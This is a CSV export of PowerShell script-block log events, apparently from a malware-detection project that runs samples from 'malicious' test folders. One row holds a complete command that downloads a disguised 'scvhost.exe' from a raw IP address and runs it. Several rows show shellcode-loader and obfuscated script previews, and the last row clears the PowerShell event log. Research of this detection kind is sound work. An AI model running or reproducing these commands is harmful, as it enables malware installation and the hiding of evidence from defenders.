"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/5/2026 8:21:02 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\13.ps1","7664","[stRIng]::joIn('' ,('36b99k32P61A32P39Z91v68&108_108b73k109P112_111b114Z116v40b34Z107v101_114I110A101F108b51v50_46Z100b108_108b34k41F93_112b117Z98A108P105_99k32Z115A116I97&116b105F99P32I101_120I116Z10"
"8/5/2026 8:21:02 AM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\13.ps1'"
"8/5/2026 8:20:59 AM","","9","$global:?"
"8/5/2026 8:20:58 AM","","29","Write-Host 'Final result: 1';"
"8/5/2026 8:20:38 AM","C:\TA\project-ta\data_spliting\test_set\malicious\112.ps1","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/5/2026 8:20:37 AM","","151","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\112.ps1'"
"8/5/2026 8:20:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:20:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:20:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:20:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:20:21 AM","C:\TA\project-ta\data_spliting\test_set\malicious\102.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:20:21 AM","","151","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\102.ps1'"
"8/5/2026 8:20:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:20:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:20:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:20:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:20:09 AM","C:\TA\project-ta\data_spliting\test_set\malicious\82.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:20:09 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\82.ps1'"
"8/5/2026 8:20:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:20:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:19:59 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:19:59 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:19:59 AM","C:\TA\project-ta\data_spliting\test_set\malicious\67.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:19:59 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\67.ps1'"
"8/5/2026 8:19:18 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:19:18 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:19:18 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:19:18 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:19:18 AM","C:\TA\project-ta\data_spliting\test_set\malicious\66.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:19:18 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\66.ps1'"
"8/5/2026 8:19:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:19:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:19:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:19:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:19:09 AM","C:\TA\project-ta\data_spliting\test_set\malicious\61.ps1","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:19:09 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\61.ps1'"
"8/5/2026 8:18:51 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:18:51 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:18:51 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:18:51 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:18:51 AM","C:\TA\project-ta\data_spliting\test_set\malicious\52.ps1","2711","$6UhT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/5/2026 8:18:51 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\52.ps1'"
"8/5/2026 8:18:39 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:18:39 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:18:39 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:18:39 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:18:39 AM","C:\TA\project-ta\data_spliting\test_set\malicious\14.ps1","2244","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/5/2026 8:18:39 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\14.ps1'"
"8/5/2026 8:18:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:18:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:18:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:18:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:18:28 AM","C:\TA\project-ta\data_spliting\test_set\malicious\13.ps1","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:18:28 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\13.ps1'"
"8/5/2026 8:18:25 AM","","9","$global:?"
"8/5/2026 8:18:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:18:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:18:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:18:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:18:24 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\11.ps1'"
"8/5/2026 8:17:46 AM","","6","prompt"
"8/5/2026 8:17:46 AM","","55"," wevtutil cl ""Microsoft-Windows-PowerShell/Operational"""
